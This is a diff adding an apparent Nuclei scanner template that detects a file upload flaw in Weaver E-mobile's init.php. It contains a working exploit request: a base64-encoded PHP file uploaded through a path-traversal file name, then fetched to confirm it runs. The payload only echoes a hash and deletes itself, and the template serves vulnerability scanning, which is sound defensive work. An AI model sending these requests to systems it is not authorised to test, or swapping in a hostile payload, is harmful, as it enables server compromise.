@@ -1,0 +1,31 @@
+id: e-cology init.php 文件上传
+
+
+info:
+  name: /init.php 存在文件上传漏洞
+  author: pikpikcu
+  description: 泛微 S/E-mobile/App/init.php 存在文件上传漏洞,攻击者可利用该漏洞获取系统敏感信息等
+  severity: high
+  
+http:
+  - method: 
+      - GET
+      - GET
+    path:
+      - "{{BaseURL}}/E-mobile/App/Init.php?m=createDo_Email&upload_file=PD9waHAgZWNobyBtZDUoMjMzKTt1bmxpbmsoX19GSUxFX18pPz4=&file_name=../testa123.php"
+      - "{{BaseURL}}/attachment/testa123.php"
+
+      
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+    
